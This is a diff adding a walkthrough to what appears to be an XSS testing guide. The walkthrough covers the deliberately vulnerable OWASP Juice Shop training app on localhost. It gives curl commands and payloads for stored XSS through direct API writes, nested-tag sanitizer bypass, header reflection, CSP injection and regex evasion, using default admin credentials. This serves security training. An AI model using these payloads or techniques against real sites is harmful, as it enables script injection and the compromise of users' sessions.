@@ -225,6 +225,75 @@ curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forward
 curl -sk "https://target.com/page" | grep -i "evil.com"
 ```
 
+### P2 — OWASP Juice Shop XSS (API-verb tampering, header reflection, single-pass sanitizer bypass)
+
+Juice Shop (`http://localhost:3000`) is an Angular SPA over a Sequelize/**SQLite** backend that auto-exposes CRUD on every model at `/api/{Model}` and bespoke nouns at `/rest/{noun}`. The Angular client is the *only* place input is validated, escaped, or restricted to GET — so the winning move is to talk to the REST layer directly with the verb the client never uses. Probe the model surface first:
+
+```bash
+# Enumerate the auto-CRUD model endpoints the Angular app GETs but never POSTs to
+curl -s http://localhost:3000/api/Products/1 | head
+curl -s http://localhost:3000/api/Feedbacks | head      # client only GETs these
+curl -s http://localhost:3000/rest/products/search?q= | head
+```
+
+#### (a) API-only / HTTP-verb-tampering stored XSS
+
+The Angular client renders Product `description` and Feedback `comment` with `[innerHTML]` (`bypassSecurityTrustHtml`), so HTML written into those fields executes for every viewer. The client only ever **GETs** `/api/Products` and submits feedback through a guarded form — but Sequelize still honors `PUT`/`POST` on the raw model endpoint. Bypass the client-side validation by replaying the write directly with the verb the SPA never issues:
+
+```bash
+# API-only XSS: PUT a stored payload into Product #1 description via the verb the client never uses.
+# Auth: grab a JWT from /rest/user/login first, then send it as a Bearer token.
+TOKEN=$(curl -s http://localhost:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"admin@juice-sh.op","password":"admin123"}' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
+
+curl -s -X PUT http://localhost:3000/api/Products/1 \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
+# Now load http://localhost:3000/#/search and open product #1 — the iframe fires.
+```
+
+This is *client-side-validation-bypass replay*: the SPA's form constraints and route guards never run because you bypassed the SPA. Unlocks **API-only XSS** (perform a persisted XSS attack bypassing a client-side security mechanism). The DOM-based variant on the search field — `http://localhost:3000/#/search?q=<iframe src="javascript:alert(`xss`)">` reflected into the result-count via `[innerHTML]` — unlocks **DOM XSS** / **Client-side XSS Protection** when the homegrown frontend filter is evaded.
+
+#### (b) Single-pass sanitizer + header-reflection + CSP-injection bypasses
+
+Juice Shop's server-side defenses are deliberately weak: a **single-pass (non-recursive) `sanitize-html`** call and a **homegrown regex** stripper. Because the strip runs once, a nested tag survives — the inner tag re-forms after the outer one is deleted:
+
+```bash
+# Nested-tag survival: sanitizer removes the outer <iframe>, leaving a valid one behind.
+# Send via the comment/feedback REST noun, then view it in the about/admin feedback list.
+curl -s -X POST http://localhost:3000/api/Feedbacks \
+  -H 'Content-Type: application/json' \
+  -d '{"comment":"<ifra<iframe>me src=\"javascript:alert(`xss`)\">","rating":1,"captcha":"0","captchaId":1}'
+```
+
+- `<ifra<iframe>me src=javascript:>` — one pass strips the inner `<iframe>`, the residue concatenates to `<iframe src=javascript:>`. Unlocks **Server-side XSS Protection** (persisted XSS bypassing a server-side security mechanism).
+- **Proprietary-header reflection (`True-Client-IP` → `Last-Login-IP`):** Juice Shop trusts the proprietary `True-Client-IP` header, stores it as the user's last-login IP, and later renders it unescaped in the **Last Login IP** view. Inject the payload through the header on a login request:
+
+```bash
+# HTTP-Header XSS: payload rides in True-Client-IP, lands in Last-Login-IP, renders unescaped.
+curl -s -X POST http://localhost:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -H 'True-Client-IP: <iframe src="javascript:alert(`xss`)">' \
+  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
+# Then log in normally and open the "Last Login IP" page to fire it.
+```
+
+  Unlocks **HTTP-Header XSS**.
+- **CSP-injection via reflected username:** the registered `username` is reflected into a server-set `Content-Security-Policy` (or an inline `<script>` nonce/source context). A username crafted to break out of the policy directive — e.g. registering `</script><script>alert(`xss`)</script>` or a value that injects a permissive `script-src` source — neutralizes the CSP that would otherwise block the inline payload. Set it via the model endpoint to dodge the client form:
+
+```bash
+# CSP Bypass: write a CSP-poisoning username via the API, then visit a page that reflects it into the policy.
+curl -s -X POST http://localhost:3000/api/Users \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"csp@juice-sh.op","password":"pass","username":"<script>alert(`xss`)</script>"}'
+```
+
+  Unlocks **CSP Bypass**.
+- **Homegrown-regex sanitizer evasion:** the bespoke regex matches a fixed lowercase tag list; defeat it with case/whitespace mutation and tag-breaking — `<scRipt>`, `<svg/onload=alert(`xss`)>`, `<img src=x onerror=alert(`xss`)>` — submitted through the same `/api/Feedbacks` or `/api/Products` write path. Reinforces **Server-side XSS Protection** and **Client-side XSS Protection** where the regex (not a real parser) is the only gate.
+
+> Juice Shop note: payloads use the backtick-string form `alert(`xss`)` and prefer `<iframe src="javascript:...">` over bare `<script>` because Angular strips raw `<script>` on `[innerHTML]` bind but honors the iframe `javascript:` URL — match the framework's actual parsing behavior, not the generic payload bank.
+
 ---
 
 ## Common Root Causes
